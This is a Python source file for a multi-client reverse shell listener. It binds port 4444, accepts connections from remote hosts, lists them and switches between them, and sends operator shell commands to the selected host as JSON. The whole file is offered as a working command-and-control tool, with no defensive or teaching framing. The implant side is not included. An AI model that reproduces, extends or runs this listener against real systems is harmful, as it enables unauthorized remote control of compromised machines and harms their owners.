import socket
import selectors
import base64
import json
class MultiClientListener:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.selector = selectors.DefaultSelector()
        self.clients = {}  # Stores {conn: addr}
        self.client_ids = {}  # Stores {id: conn}
        self.current_client = None  # Active client for command execution
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.format = 'utf-8'
    def start_listener(self):
        """Starts the multi-client reverse shell listener."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        server.setblocking(False)

        self.selector.register(server, selectors.EVENT_READ, data=None)
        print(f"[*] Listening for incoming connections on {self.host}:{self.port}...")

        try:
            while True:
                events = self.selector.select(timeout=1)  # Non-blocking select
                for key, mask in events:
                    if key.data is None:
                        self.accept_client(key.fileobj)
                    else:
                        self.handle_client(key, mask)
                self.global_command_loop()
              # Handle interactive shell
        except KeyboardInterrupt:
            print("\n[!] Shutting down listener.")
        finally:
            self.selector.close()


    def global_command_loop(self):
        """Handles global commands, allowing switching between clients."""
        if not self.current_client:
            command = input("shell>> ").strip()  # ✅ Fix: Always ask for input
            if command.lower() == "list":
                self.list_clients()
            elif command.lower().startswith("switch "):
                _, client_id = command.split()
                self.switch_client(int(client_id))
            elif command.lower() == "help":
                print("Those are the commands and their functions")
                print("------------------------------------------")
                print("CTRL + C     to Exit")
                print("switch       switching from one client id to another")
                print("exit         to exit form any client interpreter\n")
                print("For more information on tools see the command-line reference on the github page.")


            else:
                print("[-] No client selected. Use 'list' and 'switch <id>'.")
        else:
            command = input(f"[Client {self.current_client}] Shell> ")
            self.command_loop(command)  # Send command to the selected client

            
    def receiving_data(self,conn):
        json_data =""
        while True:
            try:
                json_data = json_data + conn.recv(1024).decode(self.format)
                return json.loads(json_data)
            except json.JSONDecodeError:
                continue
            except ConnectionResetError:
                print("[!] Client forcibly closed the connection.")
                self.disconnect_client(conn, self.current_client)
                return None

    def accept_client(self, server_sock):
        """Accepts a new client connection."""
        conn, addr = server_sock.accept()
        conn.setblocking(False)

        client_id = len(self.clients) + 1
        self.clients[conn] = addr
        self.client_ids[client_id] = conn

        self.selector.register(conn, selectors.EVENT_READ, data=client_id)
        print(f"[+] Client {client_id} connected from {addr}")

    def handle_client(self, key, mask):
        """Handles incoming data from clients."""
        conn = key.fileobj
        client_id = key.data

        if mask & selectors.EVENT_READ:
            try:
                data = self.receiving_data(conn)
                if data:
                    print(f"\n[Client {client_id}] {data}")
                else:
                    self.disconnect_client(conn, client_id)
            except ConnectionResetError:
                self.disconnect_client(conn, client_id)


    def sending_data(self, data):
        """Send data to the currently selected client."""
        if not self.current_client:
            print("[-] No client selected. Use 'list' and 'switch <id>'.")
            return
        
        conn = self.client_ids.get(self.current_client)  # Get the selected client's socket
        if not conn:
            print(f"[-] Client {self.current_client} is no longer connected.")
            self.current_client = None
            return

        try:
            json_data = json.dumps(data)
            conn.send(json_data.encode(self.format))  # ✅ Send to the selected client socket
        except BrokenPipeError:
            print(f"[!] Client {self.current_client} disconnected unexpectedly.")
            self.disconnect_client(conn, self.current_client)




    def disconnect_client(self, conn, client_id):
        """Removes a disconnected client."""
        if conn in self.clients:
            print(f"[-] Client {client_id} disconnected.")
            self.selector.unregister(conn)
            conn.close()
            self.clients.pop(conn, None)  # ✅ Avoids KeyError
            self.client_ids.pop(client_id, None)

            if self.current_client == client_id:
                self.current_client = None


    def command_loop(self, command):
        """Handles commands for the selected client."""
        if command.lower() in ["exit", "quit"]:
            self.current_client = None
        elif command.lower() == "list":
            self.list_clients()
        elif command.lower().startswith("switch "):
            _, client_id = command.split()
            self.switch_client(int(client_id))
        else:
            conn = self.client_ids.get(self.current_client)
            if conn:
                self.sending_data(command)

    def list_clients(self):
        """Lists all connected clients."""
        print("\n[Active Clients]")
        for client_id, conn in self.client_ids.items():
            print(f"Client {client_id}: {self.clients[conn]}")
        print("\n")

    def switch_client(self, client_id):
        """Switches control to a different client."""
        if client_id in self.client_ids:
            print(f"[+] Switched to Client {client_id}")
            self.current_client = client_id
        else:
            print("[-] Invalid client ID.")

if __name__ == "__main__":
    listener = MultiClientListener()
    listener.start_listener()
